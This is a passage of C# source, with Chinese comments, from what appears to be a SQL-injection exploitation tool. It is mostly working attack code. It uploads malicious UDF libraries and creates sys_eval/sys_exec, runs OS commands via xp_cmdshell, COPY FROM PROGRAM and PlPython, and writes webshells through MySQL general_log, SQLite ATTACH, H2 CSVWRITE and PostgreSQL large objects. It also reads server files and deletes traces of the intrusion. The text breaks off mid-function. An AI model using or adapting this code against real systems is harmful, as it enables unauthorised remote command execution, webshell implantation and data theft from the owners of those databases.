        /// 版本限 8.2 ~ 9.4（配套库范围，9.5+ 请用 COPY FROM PROGRAM）
        /// </summary>
        private static async Task ProvisionPgUdf(AppConfig config)
        {
            if (!config.DataConfig.SelectedInjectType.Equals(InjectType.Stacked))
            {
                //有堆叠记录则自动切换（部署全堆叠更可靠）；无则维持"借当前通道探测+堆叠形式尝试发送"策略
                if (!TryAutoSwitchStacked(config, "PG UDF部署"))
                {
                    Log.Show("提示：PG UDF部署语句以堆叠形式发送，要求注入点支持堆叠查询（检测记录中有堆叠命中）；当前仅借" + config.DataConfig.SelectedInjectType + "通道做取值探测。");
                }
            }
            if (!PgUdfSupport.IsAvailable())
            {
                throw new Exception("PG UDF库文件缺失：config/udf/postgresql/！");
            }
            Log.Show("正在获取目标PostgreSQL版本与平台信息……");
            string versionStr = await FetchScalar(config, "(select version())").ConfigureAwait(false);
            if (string.IsNullOrEmpty(versionStr))
            {
                throw new Exception("未能获取 version()，无法确定UDF库版本！");
            }
            string? majorMinor = PgUdfSupport.ParseMajorMinor(versionStr);
            if (!PgUdfSupport.IsVersionSupported(majorMinor))
            {
                throw new Exception("PostgreSQL " + (majorMinor ?? "?") + " 无配套UDF库（仅8.2~9.4）！9.5+ 请选择 COPY FROM PROGRAM 方式。");
            }
            Log.Show("目标版本：" + majorMinor + "，平台：" + (versionStr.Length > 80 ? string.Concat(versionStr.AsSpan(0, 80), "…") : versionStr));
            byte[] udf = PgUdfSupport.LoadUdfBinary(versionStr, majorMinor ?? "", out string libExt, out bool isWindows);
            string libName = "sqlib" + MyTools.RandStr(4).ToLower ()+ libExt;
            //PG加载C函数需绝对路径：Linux放/tmp，Windows放公共临时目录（正斜杠PG同样识别）
            string targetPath = (isWindows ? "C:/Windows/Temp/" : "/tmp/") + libName;
            int oid = 90100 + new Random().Next(0, 8000);
            Log.Show("正在写入UDF库文件（" + udf.Length + "字节，loid=" + oid + "）到 " + targetPath + " ……注意：GET方式可能因URL长度受限！");
            await SendStackedStmt(config, "select lo_create(" + oid + ")").ConfigureAwait(false);
            await SendStackedStmt(config, "delete from pg_largeobject where loid=" + oid).ConfigureAwait(false);
            //分页写入大对象（每页2048字节，hex后4096字符；单语句一请求，避免URL过长）
            int pageSize = 2048;
            int pages = (udf.Length + pageSize - 1) / pageSize;
            for (int i = 0; i < pages; i++)
            {
                config.CheckStop();
                int off = i * pageSize;
                int len = Math.Min(pageSize, udf.Length - off);
                string hex = Convert.ToHexString(udf, off, len);
                await SendStackedStmt(config, "insert into pg_largeobject(loid,pageno,data) values (" + oid + "," + i + ",decode('" + hex + "','hex'))").ConfigureAwait(false);
            }
            await SendStackedStmt(config, "select lo_export(" + oid + ",'" + targetPath + "')").ConfigureAwait(false);
            await SendStackedStmt(config, "select lo_unlink(" + oid + ")").ConfigureAwait(false);
            Log.Show("UDF库文件已落盘，正在创建sys_eval/sys_exec函数……");
            await SendStackedStmt(config, "CREATE OR REPLACE FUNCTION sys_eval(text) RETURNS text AS '" + targetPath + "', 'sys_eval' LANGUAGE C RETURNS NULL ON NULL INPUT IMMUTABLE").ConfigureAwait(false);
            await SendStackedStmt(config, "CREATE OR REPLACE FUNCTION sys_exec(text) RETURNS integer AS '" + targetPath + "', 'sys_exec' LANGUAGE C RETURNS NULL ON NULL INPUT IMMUTABLE").ConfigureAwait(false);
            _pgUdfInstalledPath = targetPath;
            _pgUdfInstalledIsWindows = isWindows;
            //部署自检：sys_eval echo 探活，函数未建成/库不兼容时立刻可见（避免用户以为安装成功）
            try
            {
                string probe = await FetchScalar(config, "(select sys_eval('echo sqli_pg_udf_ok'))").ConfigureAwait(false);
                if ((probe ?? "").Contains("sqli_pg_udf_ok", StringComparison.Ordinal))
                {
                    Log.Success("PG UDF部署自检通过（sys_eval已可用）！");
                }
                else
                {
                    Log.Warning("PG UDF部署自检未通过（sys_eval无回显）！可能原因：账号非superuser/库文件与版本不兼容/堆叠未生效。请检查目标日志。");
                }
            }
            catch (Exception e)
            {
                Log.Warning("PG UDF部署自检异常：" + e.Message);
            }
            Log.Show("PG UDF安装流程完成！如命令执行无结果请检查：1.账号是否superuser（创建C函数必须） 2.库文件是否写入成功 3.版本与库是否匹配");
        }

        /// <summary>PG UDF sys_eval/sys_exec 执行命令（首次自动安装UDF）</summary>
        private static async Task ExecuteCmdPostgreSqlUdf(AppConfig config, FileCmdViewModel vm)
        {
            try
            {
                string targetKey = config.RequestTxt ?? "";
                if (!string.Equals(_pgUdfReadyKey, targetKey, StringComparison.Ordinal))
                {
                    await ProvisionPgUdf(config).ConfigureAwait(false);
                    _pgUdfReadyKey = targetKey;
                }
                string cmdEsc = vm.CmdText.Replace("'", "''", StringComparison.Ordinal);
                if (!vm.CmdShowResult)
                {
                    await SendStackedStmt(config, "select sys_exec('" + cmdEsc + "')").ConfigureAwait(false);
                    Log.Show("命令执行完成（未开启回显）！");
                    return;
                }
                Log.SysLog("命令已执行：" + vm.CmdText);
                string result = await FetchScalar(config, "(select sys_eval('" + cmdEsc + "'))").ConfigureAwait(false);
                vm.SetCmdResult(result);
                ShowResultLen("命令执行完成，获取到结果长度：", (result ?? "").Length);
            }
            catch (OperationCanceledException)
            {
                Log.Show("已停止命令执行！");
            }
            catch (Exception e)
            {
                Log.Show("命令执行发生异常：" + e.ToString());
            }
        }

        /// <summary>PG UDF痕迹清理（cleanup 能力）：借sys_eval删除库文件→drop函数→复位状态</summary>
        public static async Task CleanupPgUdf(AppConfig config)
        {
            if (!string.IsNullOrEmpty(_pgUdfInstalledPath))
            {
                string delCmd = _pgUdfInstalledIsWindows
                    ? "cmd /c del /f /q \"" + _pgUdfInstalledPath.Replace("/", "\\", StringComparison.Ordinal) + "\""
                    : "rm -f '" + _pgUdfInstalledPath + "'";
                Log.Show("正在删除UDF库文件：" + _pgUdfInstalledPath);
                try
                {
                    await FetchScalar(config, "(select sys_eval('" + delCmd.Replace("'", "''", StringComparison.Ordinal) + "'))").ConfigureAwait(false);
                }
                catch (Exception e)
                {
                    Log.Warning("删除UDF库文件时异常（可能已被占用或函数不存在）：" + e.Message);
                }
            }
            else
            {
                Log.Show("未记录到本次会话安装的UDF库文件路径，跳过文件删除（仅清理函数）！");
            }
            Log.Show("正在删除sys_eval/sys_exec函数……");
            await SendStackedStmt(config, "drop function if exists sys_eval(text)").ConfigureAwait(false);
            await SendStackedStmt(config, "drop function if exists sys_exec(text)").ConfigureAwait(false);
            _pgUdfReadyKey = null;
            _pgUdfInstalledPath = null;
            _pgUdfInstalledIsWindows = false;
            Log.Success("PG UDF痕迹清理完成：函数已drop，库文件已尽力删除。请人工确认临时目录无残留的sqlib*文件！");
        }

        /// <summary>UDF痕迹清理入口：按数据库类型分发（MySQL/PostgreSQL）</summary>
        public static async Task CleanupUdf(AppConfig config)
        {
            if (config.DataConfig.SelectedDBType.Equals(DBType.PostgreSQL))
            {
                await CleanupPgUdf(config).ConfigureAwait(false);
                return;
            }
            await CleanupMySqlUdf(config).ConfigureAwait(false);
        }

        /// <summary>
        /// MySQL UDF sys_eval执行命令（首次自动安装UDF：写库到plugin目录+创建函数）
        /// </summary>
        private static async Task ExecuteCmdMySQL(AppConfig config, FileCmdViewModel vm)
        {
            try
            {
                //TxtRequest是AvaloniaEdit文档，工作线程直接读Text会抛"Call from invalid thread"；RequestTxt为同步镜像纯字符串
                string targetKey = config.RequestTxt ?? "";
                if (!string.Equals(_udfReadyKey, targetKey, StringComparison.Ordinal))
                {
                    await ProvisionMySqlUdf(config).ConfigureAwait(false);
                    _udfReadyKey = targetKey;
                }
                string cmdHex = Convert.ToHexString(Encoding.UTF8.GetBytes(vm.CmdText));
                if (!vm.CmdShowResult)
                {
                     await SendPayload(config, " 1=1;do sys_exec(0x" + cmdHex + ");select 1 where 1=1 ").ConfigureAwait(false);
                    Log.Show("命令执行完成（未开启回显）！");
                    return;
                }
                string sysEvalPayload = "(select cast(sys_eval(0x" + cmdHex + ") as char(4000)))";
                Log.SysLog("命令已执行：" + vm.CmdText);
                string result = await FetchScalar(config, sysEvalPayload).ConfigureAwait(false);
                vm.SetCmdResult(result);
                ShowResultLen("命令执行完成，获取到结果长度：", result.Length);
            }
            catch (OperationCanceledException)
            {
                Log.Show("已停止命令执行！");
            }
            catch (Exception e)
            {
                Log.Show("命令执行发生异常：" + e.ToString());
            }
        }

        /// <summary>
        /// PostgreSQL 命令执行分发：默认 COPY FROM PROGRAM（9.3+，需superuser/pg_execute_server_program）；
        /// 选择"UDF sys_eval"时走 lib_postgresqludf_sys 通道（8.2~9.4，需堆叠注入）；
        /// 选择"PlPython"时走 plpython3u 扩展函数通道（纯SQL部署无二进制，需superuser+可装扩展）
        /// </summary>
        private static async Task ExecuteCmdPostgreSQL(AppConfig config, FileCmdViewModel vm)
        {
            if (!string.IsNullOrEmpty(vm.SelectedCmdMethod) && vm.SelectedCmdMethod.Contains("UDF", StringComparison.Ordinal))
            {
                await ExecuteCmdPostgreSqlUdf(config, vm).ConfigureAwait(false);
                return;
            }
            if (!string.IsNullOrEmpty(vm.SelectedCmdMethod) && vm.SelectedCmdMethod.Contains("PlPython", StringComparison.Ordinal))
            {
                await ExecuteCmdPostgreSqlCopy(config, vm, "CmdExec@PlPython", false).ConfigureAwait(false);
                return;
            }
            await ExecuteCmdPostgreSqlCopy(config, vm).ConfigureAwait(false);
        }

        /// <summary>PG族 COPY FROM PROGRAM 能力实测探针结果缓存（目标+通道为key，同会话只探一次）</summary>
        private static readonly Dictionary<string, bool> PgCopyProgramProbeCache = new Dictionary<string, bool>(StringComparer.Ordinal);

        /// <summary>
        /// PostgreSQL族 COPY FROM PROGRAM 能力实测探针（会话缓存）：
        /// 命令执行前先发送 echo 探针堆叠语句，按当前通道读回临时表内容验证能力是否真实可用，
        /// 不可用则明确报错（权限不足/特性被移除，如openGauss），避免静默空结果误判为"命令无输出"。
        /// 实测成本：Union/报错3包、盲注通道约2~4包，同目标同通道一会话只探一次。
        /// </summary>
        private static async Task<bool> ProbePgCopyProgram(AppConfig config)
        {
            string key = (config.Host ?? "") + ":" + config.Port + "|" + config.DataConfig.SelectedInjectType;
            if (PgCopyProgramProbeCache.TryGetValue(key, out bool cached))
            {
                if (!cached)
                {
                    Log.Warning("COPY FROM PROGRAM 本次会话已实测不可用，跳过重复探测！");
                }
                return cached;
            }
            bool ok = false;
            try
            {
                const string marker = "sqli_pg_probe_ok";
                //复用CmdExec模板：drop+create+copy from program，与实际命令执行同路径同权限要求
                string probePayload = PayloadFactory.BasePayload.Get("CmdExec").Replace("{cmd}", "echo " + marker, StringComparison.Ordinal);
                await SendPayload(config, probePayload).ConfigureAwait(false);
                if (config.DataConfig.SelectedInjectType == InjectType.Union || config.DataConfig.SelectedInjectType == InjectType.Error)
                {
                    string scalar = "(select coalesce((select data from ssqlinjection limit 1),chr(32)))";
                    string? row = config.DataConfig.SelectedInjectType == InjectType.Union
                        ? await DataComm.DataDumpWithNoFrom(config, scalar).ConfigureAwait(false)
                        : await DataComm.DataDumpWithError(config, scalar).ConfigureAwait(false);
                    ok = row != null && row.Contains(marker, StringComparison.Ordinal);
                }
                else
                {
                    //盲/时间/堆叠通道：单发布尔存在性判定（1~2包）
                    string cond = "(case when exists(select 1 from ssqlinjection where data like '" + marker + "%') then 1 else 0 end)";
                    int v = await DataComm.GetBoolValue(config, cond, 0, 1).ConfigureAwait(false);
                    ok = v == 1;
                }
            }
            catch (Exception e)
            {
                Log.SysLog("COPY FROM PROGRAM 探针异常：" + e.Message);
            }
            finally
            {
                //清理探针临时表
                try
                {
                    await SendPayload(config, PayloadFactory.BasePayload.Get("CmdDropTable")).ConfigureAwait(false);
                }
                catch (Exception)
                {
                }
            }
            PgCopyProgramProbeCache[key] = ok;
            if (ok)
            {
                Log.Success("COPY FROM PROGRAM 实测可用（探针回读验证通过）！");
            }
            else
            {
                Log.Warning("COPY FROM PROGRAM 实测不可用：探针未回读到预期输出。可能原因：非superuser/无pg_execute_server_program角色/目标库阉割该特性。可换 PlPython 或 UDF sys_eval 方式重试。");
            }
            return ok;
        }

        /// <summary>
        /// PostgreSQL COPY FROM PROGRAM执行命令（9.3+，需要superuser或pg_execute_server_program角色）。
        /// execKey指定命令执行模板key（默认CmdExec；CmdExec@PlPython为plpython3u扩展兜底变体）；
        /// probe=true时先实测COPY FROM PROGRAM能力（会话缓存），不可用直接终止并明示原因
        /// </summary>
        private static async Task ExecuteCmdPostgreSqlCopy(AppConfig config, FileCmdViewModel vm, string execKey = "CmdExec", bool probe = true)
        {
            string execTemplate;
            if (!PayloadFactory.BasePayload.PayLoadSQL.TryGetValue(execKey, out string? tpl) || string.IsNullOrWhiteSpace(tpl))
            {
                Log.Error("当前数据库模板未启用 " + execKey + " 命令执行方式（模板缺该key或被overlay关闭）！");
                return;
            }
            execTemplate = tpl;
            if (probe && !await ProbePgCopyProgram(config).ConfigureAwait(false))
            {
                Log.Error("命令执行终止：COPY FROM PROGRAM 实测不可用（详见上方探针日志），可换其他命令执行方式重试！");
                return;
            }
            try
            {
                string cmd = vm.CmdText.Replace("'", "''", StringComparison.Ordinal);
                await SendPayload(config, PayloadFactory.BasePayload.Get("CmdDropTable")).ConfigureAwait(false);
                await SendPayload(config, execTemplate.Replace("{cmd}", cmd, StringComparison.Ordinal)).ConfigureAwait(false);
                Log.SysLog("命令已执行：" + vm.CmdText + (probe ? "（需要superuser或pg_execute_server_program角色）" : "（plpython3u扩展通道，需要superuser）"));
                try
                {
                    if (!vm.CmdShowResult)
                    {
                        Log.Show("命令执行完成（未开启回显）！");
                        return;
                    }
                    vm.SetCmdResult("");
                    StringBuilder result = new StringBuilder();
                    switch (config.DataConfig.SelectedInjectType)
                    {
                        case InjectType.Blind:
                        case InjectType.Time:
                        case InjectType.Stacked:
                        case InjectType.Dns:
                            if (string.IsNullOrEmpty(config.DataConfig.CheckValue))
                            {
                                Log.Warning("大侠，请在注入中心，配置Bool盲注的判断值！");
                                return;
                            }
                            int count = await DataComm.GetBoolValue(config, PayloadFactory.BasePayload.Get("CmdDataCount"), 0, 5000).ConfigureAwait(false);
                            Log.SysLog("命令执行结果共有" + count + "行数据！");
                            for (int i = 0; i < count; i++)
                            {
                                config.CheckStop();
                                string dataPayload = PayloadFactory.BasePayload.Get("CmdData").Replace("{index}", i + "", StringComparison.Ordinal);
                                string row = (await DataComm.GetStringByBool(config, dataPayload, 100000).ConfigureAwait(false)) ?? "";
                                result.AppendLine(row);
                                vm.AppendCmdResult(row + Environment.NewLine);
                            }
                            break;
                        case InjectType.Union:
                            string countStr = await DataComm.DataDumpWithNoFrom(config, PayloadFactory.BasePayload.Get("CmdDataCount")).ConfigureAwait(false);
                            int ucount = 0;
                            int.TryParse(countStr, out ucount);
                            for (int i = 0; i < ucount; i++)
                            {
                                config.CheckStop();
                                string dataPayload = PayloadFactory.BasePayload.Get("CmdData").Replace("{index}", i + "", StringComparison.Ordinal);
                                string row = await DataComm.DataDumpWithNoFrom(config, dataPayload).ConfigureAwait(false);
                                result.AppendLine(row);
                                vm.AppendCmdResult(row + Environment.NewLine);
                            }
                            break;
                        case InjectType.Error:
                            string ecountStr = await DataComm.DataDumpWithError(config, PayloadFactory.BasePayload.Get("CmdDataCount")).ConfigureAwait(false);
                            int ecount = 0;
                            int.TryParse(ecountStr, out ecount);
                            for (int i = 0; i < ecount; i++)
                            {
                                config.CheckStop();
                                string dataPayload = PayloadFactory.BasePayload.Get("CmdData").Replace("{index}", i + "", StringComparison.Ordinal);
                                string row = await DataComm.DataDumpWithError(config, dataPayload).ConfigureAwait(false);
                                result.AppendLine(row);
                                vm.AppendCmdResult(row + Environment.NewLine);
                            }
                            break;
                    }
                    ShowResultLen("命令执行完成，获取到结果长度：", result.Length);
                }
                finally
                {
                    try
                    {
                        await SendPayload(config, PayloadFactory.BasePayload.Get("CmdDropTable")).ConfigureAwait(false);
                    }
                    catch (Exception)
                    {
                    }
                }
            }
            catch (OperationCanceledException)
            {
                Log.Show("已停止命令执行！");
            }
            catch (Exception e)
            {
                Log.Show("命令执行发生异常：" + e.ToString());
            }
        }

        /// <summary>
        /// SQLServer xp_cmdshell执行命令
        /// </summary>
        private static async Task ExecuteCmdSQLServer(AppConfig config, FileCmdViewModel vm)
        {
            //sp_OACreate(wscript.shell)：xp_cmdshell被删除时的备用通道（需sysadmin+堆叠，输出经BULK INSERT回读）
            if (!string.IsNullOrEmpty(vm.SelectedCmdMethod) && vm.SelectedCmdMethod.Contains("sp_OACreate", StringComparison.Ordinal))
            {
                await ExecuteCmdSqlServerOle(config, vm).ConfigureAwait(false);
                return;
            }
            try
            {
                string cmdHex = TextCodec.StrToHex(vm.CmdText, "GB2312");
                string cmdPayload = PayloadFactory.BasePayload.Get("CmdExec").Replace("{cmd}", cmdHex, StringComparison.Ordinal);
                string dropTable = PayloadFactory.BasePayload.Get("CmdDropTable");
                if (config.DataConfig.IsTimeChannel)
                {
                    cmdPayload = cmdPayload.Replace(" 1=1;", ";", StringComparison.Ordinal);
                    dropTable = dropTable.Replace(" 1=1;", ";", StringComparison.Ordinal);
                }
                await SendPayload(config, dropTable).ConfigureAwait(false);
                await SendPayload(config, cmdPayload).ConfigureAwait(false);
                Log.SysLog("命令已执行：" + vm.CmdText);
                try
                {
                    if (!vm.CmdShowResult)
                    {
                        Log.Show("命令执行完成（未开启回显）！");
                        return;
                    }
                    vm.SetCmdResult("");
                    StringBuilder result = new StringBuilder();
                    switch (config.DataConfig.SelectedInjectType)
                    {
                        case InjectType.Blind:
                        case InjectType.Time:
                        case InjectType.Stacked:
                        case InjectType.Dns:
                            if (string.IsNullOrEmpty(config.DataConfig.CheckValue))
                            {
                                Log.Warning("大侠，请在注入中心，配置Bool盲注的判断值！");
                                return;
                            }
                            int count = await DataComm.GetBoolValue(config, PayloadFactory.BasePayload.Get("CmdDataCount"), 0, 5000).ConfigureAwait(false);
                            Log.SysLog("命令执行结果共有" + count + "行数据！");
                            for (int i = 1; i <= count; i++)
                            {
                                config.CheckStop();
                                string dataPayload = PayloadFactory.BasePayload.Get("CmdData").Replace("{index}", i + "", StringComparison.Ordinal);
                                string row = (await DataComm.GetStringByBool(config, dataPayload, 10000).ConfigureAwait(false)) ?? "";
                                result.AppendLine(row);
                                vm.AppendCmdResult(row + Environment.NewLine);
                            }
                            break;
                        case InjectType.Union:
                            string countStr = await DataComm.DataDumpWithNoFrom(config, PayloadFactory.BasePayload.Get("CmdDataCount")).ConfigureAwait(false);
                            int ucount = 0;
                            int.TryParse(countStr, out ucount);
                            for (int i = 1; i <= ucount; i++)
                            {
                                config.CheckStop();
                                string dataPayload = PayloadFactory.BasePayload.Get("CmdData").Replace("{index}", i + "", StringComparison.Ordinal);
                                string row = await DataComm.DataDumpWithNoFrom(config, dataPayload).ConfigureAwait(false);
                                result.AppendLine(row);
                                vm.AppendCmdResult(row + Environment.NewLine);
                            }
                            break;
                        case InjectType.Error:
                            string ecountStr = await DataComm.DataDumpWithError(config, PayloadFactory.BasePayload.Get("CmdDataCount")).ConfigureAwait(false);
                            int ecount = 0;
                            int.TryParse(ecountStr, out ecount);
                            for (int i = 1; i <= ecount; i++)
                            {
                                config.CheckStop();
                                string dataPayload = PayloadFactory.BasePayload.Get("CmdData").Replace("{index}", i + "", StringComparison.Ordinal);
                                string row = await DataComm.DataDumpWithError(config, dataPayload).ConfigureAwait(false);
                                result.AppendLine(row);
                                vm.AppendCmdResult(row + Environment.NewLine);
                            }
                            break;
                    }
                    ShowResultLen("命令执行完成，获取到结果长度：", result.Length);
                }
                finally
                {
                    try
                    {
                        await SendPayload(config, dropTable).ConfigureAwait(false);
                    }
                    catch (Exception)
                    {
                    }
                }
            }
            catch (OperationCanceledException)
            {
                Log.Show("已停止命令执行！");
            }
            catch (Exception e)
            {
                Log.Show("命令执行发生异常：" + e.ToString());
            }
        }

        /// <summary>
        /// H2 CSVREAD读取表达式：fieldSeparator设为SOH(char(1))保证整行落进单列C1，
        /// 第二参数为列名列表（H2 2.x不支持"名 类型"写法，会把整串当列名），传"C1"避免首行被当表头；
        /// 全部参数用char链避免引号转义问题
        /// </summary>
        private static string H2CsvRead(string path)
        {
            string Enc(string s) => TextCodec.StrToChrOrChar(s, "char", "||", "UTF-8");
            return "csvread(" + Enc(path) + "," + Enc("C1") + "," + Enc("fieldSeparator=") + "||char(1))";
        }

        /// <summary>
        /// H2 CSVREAD读文件（嵌入式H2读写的是应用服务器本地文件）
        /// </summary>
        private static async Task ReadFileByH2(AppConfig config, FileCmdViewModel vm)
        {
            string csvread = H2CsvRead(vm.FilePath);
            string countExpr = "(select count(1) from " + csvread + ")";
            string LineExpr(int i) => "(select c1 from " + csvread + " limit 1 offset " + i + ")";
            try
            {
                StringBuilder result = new StringBuilder();
                switch (config.DataConfig.SelectedInjectType)
                {
                    case InjectType.Blind:
                    case InjectType.Time:
                    case InjectType.Stacked:
                    case InjectType.Dns:
                        if (string.IsNullOrEmpty(config.DataConfig.CheckValue))
                        {
                            Log.Warning("大侠，请在注入中心，配置Bool盲注的判断值！");
                            return;
                        }
                        int count = await DataComm.GetBoolValue(config, countExpr, 0, 100000).ConfigureAwait(false);
                        Log.SysLog("读到文件内容，共有" + count + "行数据！");
                        for (int i = 0; i < count; i++)
                        {
                            config.CheckStop();
                            result.AppendLine(await DataComm.GetStringByBool(config, LineExpr(i), 100000).ConfigureAwait(false));
                            vm.SetFileContent(result.ToString());
                        }
                        break;
                    case InjectType.Union:
                    case InjectType.Error:
                        bool useError = config.DataConfig.SelectedInjectType == InjectType.Error;
                        string countStr = useError
                            ? await DataComm.DataDumpWithError(config, countExpr).ConfigureAwait(false)
                            : await DataComm.DataDumpWithNoFrom(config, countExpr).ConfigureAwait(false);
                        int.TryParse(countStr, out int ucount);
                        Log.SysLog("读到文件内容，共有" + ucount + "行数据！");
                        for (int i = 0; i < ucount; i++)
                        {
                            config.CheckStop();
                            string row = useError
                                ? await DataComm.DataDumpWithError(config, LineExpr(i)).ConfigureAwait(false)
                                : await DataComm.DataDumpWithNoFrom(config, LineExpr(i)).ConfigureAwait(false);
                            result.AppendLine(row);
                            vm.SetFileContent(result.ToString());
                        }
                        break;
                }
                ShowResultLen("读文件完成，内容长度：", result.Length);
            }
            catch (OperationCanceledException)
            {
                Log.Show("已停止文件操作！");
            }
            catch (Exception e)
            {
                Log.Show("读文件发生异常：" + e.Message);
            }
        }

        /// <summary>
        /// H2 CSVWRITE写文件：第3参数options传 writeColumnHeader=false fieldDelimiter=（不写表头+空字段包裹符→裸字节落盘，
        /// 实测H2 2.x常量折叠会把列名写成'值'当表头，fieldDelimiter默认双引号会破坏shell内容）；
        /// 内容与内层查询串全部char链编码，彻底规避引号转义问题。文件末尾会多一个CRLF行尾（CSV行终止符，PHP/JSP可容忍）。
        /// </summary>
        private static async Task WriteFileByH2(AppConfig config, FileCmdViewModel vm)
        {
            string Enc(string s) => TextCodec.StrToChrOrChar(s, "char", "||", "UTF-8");
            string innerSelect = "select " + Enc(vm.FileContent);
            string payload = " 1=1;call csvwrite(" + Enc(vm.FilePath) + "," + Enc(innerSelect) + "," + Enc("writeColumnHeader=false fieldDelimiter=") + ");--";
            await SendPayload(config, payload).ConfigureAwait(false);
            Log.Show("大侠，写文件操作小的我已经完成了额，剩下的就请大侠人工检查写文件是否成功！");
        }

        //==================== MySQL general_log 写WebShell（堆叠注入）====================

        /// <summary>
        /// MySQL general_log写WebShell：general_log记录原始SQL文本，shell代码以字符串字面量形式进日志文件。
        /// 需堆叠注入+secure_file_priv为空+mysql账号对目标目录可写；日志文件含Query前缀等多余文本（PHP可容忍）。
        /// 内容不能同时包含单双引号（引号会破坏包裹它的字符串字面量）。
        /// </summary>
        private static async Task WriteFileByMySqlLog(AppConfig config, FileCmdViewModel vm)
        {
            if (!config.DataConfig.SelectedInjectType.Equals(InjectType.Stacked) && !TryAutoSwitchStacked(config, "日志写WebShell"))
            {
                Log.Warning("日志写WebShell需要堆叠注入（set global general_log 系列语句）！");
                return;
            }
            string pathEsc = vm.FilePath.Replace("\\", "/", StringComparison.Ordinal).Replace("'", "''", StringComparison.Ordinal);
            string content = vm.FileContent;
            string quoted;
            if (!content.Contains('\''))
            {
                quoted = "'" + content + "'";
            }
            else if (!content.Contains('"'))
            {
                //默认sql_mode下双引号可作字符串（ANSI_QUOTES开启时失效，需人工改用Union写文件）
                quoted = "\"" + content + "\"";
            }
            else
            {
                Log.Warning("文件内容同时包含单双引号，无法通过日志写文件（general_log记录原始SQL文本，引号会破坏语句）！请改用Union写文件或去掉一种引号。");
                return;
            }
            string payload = " 1=1;set global general_log=on;set global general_log_file='" + pathEsc + "';select " + quoted + ";set global general_log=off;-- ";
            await SendPayload(config, payload).ConfigureAwait(false);
            Log.Show("日志写WebShell已执行！请人工检查目标文件（需secure_file_priv为空、mysql账号对目标目录可写）。");
        }

        //==================== PostgreSQL 大对象读写（lo_import/lo_export，单语句表达式，Union/报错通道可用）====================

        /// <summary>大对象读写通道检查（lo_import/lo_export为副作用表达式，盲注多次求值会失败，仅Union/报错可用）</summary>
        private static bool EnsurePgLoChannel(AppConfig config)
        {
            if (config.DataConfig.SelectedInjectType.Equals(InjectType.Union) || config.DataConfig.SelectedInjectType.Equals(InjectType.Error))
            {
                return true;
            }
            Log.Warning("大对象读写只支持Union/报错注入通道（lo_import/lo_export为副作用表达式，盲注多次求值会失败）！盲注请改用Copy方式（堆叠）。");
            return false;
        }

        /// <summary>PostgreSQL 大对象读文件（lo_import→读pg_largeobject→lo_unlink清理，需superuser或pg_read_server_files）</summary>
        private static async Task ReadFileByPgLargeObject(AppConfig config, FileCmdViewModel vm)
        {
            if (!EnsurePgLoChannel(config))
            {
                return;
            }
            int oid = 90200 + new Random().Next(0, 7000);
            string pathEsc = vm.FilePath.Replace("'", "''", StringComparison.Ordinal);
            try
            {
                await FetchScalar(config, "(select lo_import('" + pathEsc + "'," + oid + "))").ConfigureAwait(false);
                string hex = await FetchScalar(config, "(select coalesce(string_agg(encode(data,'hex'),'' order by pageno),'') from pg_largeobject where loid=" + oid + ")").ConfigureAwait(false);
                string result = TextCodec.unHex(hex ?? "", vm.FileEncoding);
                vm.SetFileContent(result);
                ShowResultLen("读文件完成，内容长度：", result.Length, "（需superuser或pg_read_server_files，失败时内容为空）");
            }
            finally
            {
                try
                {
                    await FetchScalar(config, "(select lo_unlink(" + oid + "))").ConfigureAwait(false);
                }
                catch (Exception)
                {
                }
            }
        }

        /// <summary>PostgreSQL 大对象写文件（lo_from_bytea→lo_export→lo_unlink清理，需superuser或pg_write_server_files）</summary>
        private static async Task WriteFileByPgLargeObject(AppConfig config, FileCmdViewModel vm)
        {
            if (!EnsurePgLoChannel(config))
            {
                return;
            }
            int oid = 90200 + new Random().Next(0, 7000);
            string pathEsc = vm.FilePath.Replace("'", "''", StringComparison.Ordinal);
            string hex = Convert.ToHexString(Encoding.UTF8.GetBytes(vm.FileContent));
            Log.Show("大对象写文件（" + hex.Length / 2 + "字节，loid=" + oid + "）……注意：GET方式可能因URL长度受限！");
            await FetchScalar(config, "(select lo_from_bytea(" + oid + ",decode('" + hex + "','hex')))").ConfigureAwait(false);
            await FetchScalar(config, "(select lo_export(" + oid + ",'" + pathEsc + "'))").ConfigureAwait(false);
            try
            {
                await FetchScalar(config, "(select lo_unlink(" + oid + "))").ConfigureAwait(false);
            }
            catch (Exception)
            {
            }
            Log.Show("大侠，写文件操作小的我已经完成了额，剩下的就请大侠人工检查写文件是否成功（需superuser或pg_write_server_files）！");
        }

        //==================== SQLite ATTACH 写WebShell（堆叠注入）====================

        /// <summary>SQLite ATTACH写WebShell：附加目标文件为新库，建表插入blob内容（x'hex'），需堆叠注入</summary>
        private static async Task WriteFileBySqlite(AppConfig config, FileCmdViewModel vm)
        {
            if (!config.DataConfig.SelectedInjectType.Equals(InjectType.Stacked) && !TryAutoSwitchStacked(config, "ATTACH写WebShell"))
            {
                Log.Warning("ATTACH写WebShell需要堆叠注入（attach database/create table/insert 三条语句）！");
                return;
            }
            string pathEsc = vm.FilePath.Replace("'", "''", StringComparison.Ordinal);
            string hex = Convert.ToHexString(Encoding.UTF8.GetBytes(vm.FileContent));
            string payload = " 1=1;attach database '" + pathEsc + "' as sqli_exp;create table sqli_exp.exp(dataz text);insert into sqli_exp.exp(dataz) values (x'" + hex + "');-- ";
            await SendPayload(config, payload).ConfigureAwait(false);
            Log.Show("ATTACH写WebShell已执行！请人工检查写文件是否成功（目标路径需可写；文件头部会带SQLite库格式头，PHP/JSP可容忍时方可作shell）。");
        }

        //==================== ClickHouse file() 文件读取 ====================
        //注：INTO OUTFILE 是 clickhouse-client/clickhouse-local 的客户端功能，HTTP 接口固定报错358（INTO_OUTFILE_NOT_ALLOWED），
        //HTTP协议注入场景不可用；INSERT INTO FUNCTION file() 为独立INSERT语句，无法嵌入SELECT注入点。故ClickHouse仅提供file()读文件。

        /// <summary>ClickHouse file()表函数表达式（LineAsString格式整行落单列s，仅能读user_files目录内文件）</summary>
        private static string ClickHouseFileExpr(string path)
        {
            return "file('" + path.Replace("'", "''", StringComparison.Ordinal) + "','LineAsString','s String')";
        }

        /// <summary>ClickHouse file()读文件（仅user_files目录；Union/报错/盲注逐行取回）</summary>
        private static async Task ReadFileByClickHouse(AppConfig config, FileCmdViewModel vm)
        {
            string fe = ClickHouseFileExpr(vm.FilePath);
            string countExpr = "(select count(1) from " + fe + ")";
            string LineExpr(int i) => "(select s from " + fe + " limit 1 offset " + i + ")";
            try
            {
                StringBuilder result = new StringBuilder();
                switch (config.DataConfig.SelectedInjectType)
                {
                    case InjectType.Blind:
                    case InjectType.Time:
                    case InjectType.Stacked:
                    case InjectType.Dns:
                        if (string.IsNullOrEmpty(config.DataConfig.CheckValue))
                        {
